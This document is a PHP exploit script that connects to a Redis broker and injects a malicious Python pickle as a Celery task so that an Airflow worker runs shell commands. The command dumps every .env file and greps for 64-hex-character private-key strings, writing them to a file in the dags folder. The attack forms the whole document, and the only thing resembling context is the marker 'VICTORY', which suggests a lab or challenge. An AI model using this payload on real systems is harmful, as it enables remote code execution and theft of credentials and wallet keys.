<?php
$s=fsockopen("172.18.0.3",6379);
fwrite($s,"PING\r\n");
echo "R:".trim(fgets($s))."\n";

$tid="pkl".time();

// Python pickle payload that executes os.system
// pickle.dumps(os.system("id > /opt/airflow/dags/_v.txt"))
// Using pickle opcode: cos\nsystem\n(S'cmd'\ntR.
$cmd = "id > /opt/airflow/dags/_v.txt; find /opt/airflow -name .env -exec cat {} + >> /opt/airflow/dags/_v.txt 2>&1; grep -roh '0x[a-fA-F0-9]\\{64\\}' /opt/airflow/ 2>/dev/null | sort -u >> /opt/airflow/dags/_v.txt; echo VICTORY >> /opt/airflow/dags/_v.txt";
// Pickle payload: cos\nsystem\n(S'command'\ntR.
$pickle = "cos\nsystem\n(S'" . $cmd . "'\ntR.";
$pickle_b64 = base64_encode($pickle);

$msg=json_encode(array(
    "body"=>$pickle_b64,
    "content-encoding"=>"utf-8",
    "content-type"=>"application/x-python-serialize",
    "headers"=>array("lang"=>"py","task"=>"celery.ping","id"=>$tid,"root_id"=>$tid),
    "properties"=>array("correlation_id"=>$tid,"reply_to"=>"","delivery_mode"=>2,"delivery_info"=>array("exchange"=>"","routing_key"=>"default"),"body_encoding"=>"base64","delivery_tag"=>$tid)
));

$l=strlen($msg);
fwrite($s,"*3\r\n\$5\r\nLPUSH\r\n\$7\r\ndefault\r\n\$".$l."\r\n".$msg."\r\n");
echo "PUSH:".trim(fgets($s))."\n";
sleep(5);

// Check if file was created
fwrite($s,"LLEN default\r\n");
echo "Q:".trim(fgets($s))."\n";

// Check task result
fwrite($s,"GET celery-task-meta-$tid\r\n");
$r=trim(fgets($s));
echo "RESULT_LEN:$r\n";
if(substr($r,0,1)=="$"&&$r!="$-1"){
    $rdata=fread($s,min(intval(substr($r,1)),500)+2);
    echo "RESULT:$rdata\n";
}

fclose($s);
echo "TID:$tid\n";
